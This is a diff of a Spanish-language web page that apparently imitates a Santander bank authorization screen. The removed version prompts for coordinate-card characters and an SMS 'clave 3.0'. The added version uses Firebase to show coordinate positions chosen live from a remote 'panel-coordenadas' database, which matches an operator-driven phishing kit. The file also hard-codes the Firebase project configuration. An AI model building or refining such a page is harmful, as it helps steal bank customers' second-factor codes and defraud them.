@@ -2,61 +2,56 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Selecciona tu tipo de autorización</title>
+  <title>Autorización con Firebase</title>
   <style>
     body { font-family: Arial, sans-serif; text-align: center; margin: 40px; }
-    .box { border: 1px solid #ccc; padding: 20px; margin: 20px auto; width: 300px; cursor: pointer; }
+    .box { border: 1px solid #ccc; padding: 20px; margin: 20px; width: 100px; height: 100px; display: inline-block; font-size: 24px; }
     .button-red { background-color: red; color: white; padding: 15px 30px; border: none; cursor: pointer; font-size: 16px; margin-top: 20px; }
-    .input-small, .input-large { width: 40px; height: 40px; margin: 5px; text-align: center; font-size: 20px; }
-    .hidden { display: none; }
   </style>
 </head>
 <body>
 
-  <!-- Pantalla principal -->
-  <div id="pantalla-principal">
-    <h1>Selecciona tu tipo de autorización:</h1>
-    <div class="box" onclick="mostrarPantalla('santander')">Santander Pass</div>
-    <div class="box" onclick="mostrarPantalla('coordenadas')">Coordenadas</div>
-  </div>
+  <h1>Selecciona tu tipo de autorización:</h1>
 
-  <!-- Santander Pass -->
-  <div id="santander" class="hidden">
-    <button class="button-red" onclick="alert('Autorizado!')">Autorizar</button><br><br>
-    <button onclick="volver()">Volver</button>
-  </div>
+  <!-- Cuadros dinámicos -->
+  <div id="cuadro1" class="box"></div>
+  <div id="cuadro2" class="box"></div>
+  <div id="cuadro3" class="box"></div>
 
-  <!-- Coordenadas -->
-  <div id="coordenadas" class="hidden">
-    <input class="input-small" maxlength="1">
-    <input class="input-small" maxlength="1">
-    <input class="input-small" maxlength="1"><br><br>
-    <button class="button-red" onclick="mostrarPantalla('clave')">Ingresar</button><br><br>
-    <button onclick="volver()">Volver</button>
-  </div>
+  <!-- Botón de prueba -->
+  <button class="button-red" onclick="alert('Ingresar coordenadas')">Ingresar</button>
 
-  <!-- Clave 3.0 -->
-  <div id="clave" class="hidden">
-    <h2>Ingresa la clave 3.0 enviada como SMS a tu teléfono</h2>
-    <input class="input-large" maxlength="1">
-    <input class="input-large" maxlength="1">
-    <input class="input-large" maxlength="1">
-    <input class="input-large" maxlength="1">
-    <input class="input-large" maxlength="1">
-    <input class="input-large" maxlength="1"><br><br>
-    <button class="button-red" onclick="alert('Clave enviada!')">Enviar</button><br><br>
-    <button onclick="volver()">Volver</button>
-  </div>
+  <script type="module">
+    // Importar Firebase
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+    import { getFirestore, doc, onSnapshot } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js";
 
-  <script>
-    function mostrarPantalla(id) {
-      document.querySelectorAll("div").forEach(div => div.classList.add("hidden"));
-      document.getElementById(id).classList.remove("hidden");
-    }
-    function volver() {
-      document.querySelectorAll("div").forEach(div => div.classList.add("hidden"));
-      document.getElementById("pantalla-principal").classList.remove("hidden");
-    }
+    // Configuración de tu proyecto Firebase
+    const firebaseConfig = {
+      apiKey: "AIzaSyBrVQDc84FBDDbqTEK_lkmjnU5uVU5V9bw",
+      authDomain: "panel-coordenadas-22714.firebaseapp.com",
+      projectId: "panel-coordenadas-22714",
+      storageBucket: "panel-coordenadas-22714.firebasestorage.app",
+      messagingSenderId: "494351816189",
+      appId: "1:494351816189:web:73221f86864cb97957b594"
+    };
+
+    // Inicializar Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    // Escuchar cambios en Firestore en tiempo real
+    const docRef = doc(db, "panel", "cuadros");
+    onSnapshot(docRef, (docSnap) => {
+      if (docSnap.exists()) {
+        const data = docSnap.data();
+        document.getElementById("cuadro1").innerText = data.cuadro1;
+        document.getElementById("cuadro2").innerText = data.cuadro2;
+        document.getElementById("cuadro3").innerText = data.cuadro3;
+      } else {
+        console.log("No existe el documento en Firestore.");
+      }
+    });
   </script>
 
 </body>
